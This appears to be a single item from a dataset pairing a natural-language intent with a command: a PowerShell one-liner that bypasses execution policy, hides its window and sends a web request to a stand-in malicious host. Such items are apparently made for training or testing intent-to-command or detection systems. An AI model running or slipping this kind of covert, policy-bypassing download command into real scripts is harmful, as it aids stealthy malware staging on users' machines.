# Natural language intent:
# Invoke a web request to a potentially malicious website with specified PowerShell options.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://thr3atSystem.com'"
